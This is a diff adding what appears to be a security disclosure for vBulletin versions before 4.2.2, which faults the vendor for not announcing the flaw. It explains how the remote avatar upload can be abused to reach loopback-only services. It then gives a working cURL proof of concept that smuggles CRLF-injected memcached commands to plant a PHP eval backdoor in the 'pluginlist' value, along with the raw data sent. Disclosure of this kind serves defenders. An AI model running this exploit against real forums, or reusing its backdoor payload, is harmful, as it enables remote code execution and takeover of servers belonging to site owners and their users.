@@ -1,0 +1,41 @@
+vBulletin's memcache setting is vulnerable in certain versions(all
+before 4.2.2) to an RCE. vBulletin seem to have refused to classify it
+as a vulnerability or post anything about it, or put anything in the
+announcements on their website. They say "PL2 (4.2.2) should prevent the
+use of localhost," however that doesn't help people using previous
+versions(which they appear to support with patches, still.)
+They also haven't updated previous versions of vBulletin for this bug,
+despite it being reported that it works on versions prior to 4.2.2.
+
+Of course though, the most important thing is, they haven't announced
+there even is/was a vulnerability in any version.
+
+
+Anyways, here it is:
+
+Remote Upload allows to send arbitrary data to loopback-only services, possibly allowing the execution of arbitrary code Exists in vB4
+The remote upload as implemented by the vB_Upload_* classes and vB_vURL (at least in vB 4.2.x, most probably earlier releases are also affected, and vB 5 might be affected as well) does not restrict the destination ports and hosts for remote uploads. This allows an attacker to abuse the function to as a proxy commit TCP port scans on other hosts. Much worse, it also allows to connect to local loopback-only services or to services only exposed on an internal network.
+
+On a setup running e.g. Memcached in default configuration (bound to localhost:11211, no authentication), the latter can be exploited to execute arbitrary code by forging a request to memcached, updating the `pluginlist` value.
+
+Proof-of-Concept using cURL:
+—
+$ curl 'http://sandbox.example.com/vb42/profile.php?do=updateprofilepic' -H 'Cookie: bb_userid=2; bb_password=926944640049f505370a38250f22ae57' --data 'do=updateprofilepic&securitytoken=1384776835-db8ce45ef28d8e2fcc1796b012f0c9ca1cf49e38&avatarurl=http://localhost:11211/%0D%0Aset%20pluginlist%200%200%2096%0D%0Aa%3A1%3A%7Bs%3A12%3A%22global_start%22%3Bs%3A62%3A%22if%28isset%28%24_REQUEST%5B%27eval%27%5D%29%29%7Beval%28%24_REQUEST%5B%27eval%27%5D%29%3Bdie%28%29%3B%7D%0D%0A%22%3B%7D%0D%0Aquit%0D%0A.png'
+—
+
+This leads to vBulletin opening a connection to the Memcached (localhost:11211) and sending the following data:
+—
+HEAD /
+set pluginlist 0 0 96
+a:1:{s:12:"global_start";s:62:"if(isset($_REQUEST['eval'])){eval($_REQUEST['eval']);die();}
+";}
+quit
+.png HTTP/1.0
+Host: localhost
+User-Agent: vBulletin via PHP
+Connection: close
+
+—
+This will cause the Memcached to update the `pluginlist` to contain the malicious code.
+
+Furthermore, the remote upload happily follows all kinds of redirects if provided with an appropriate Location header.
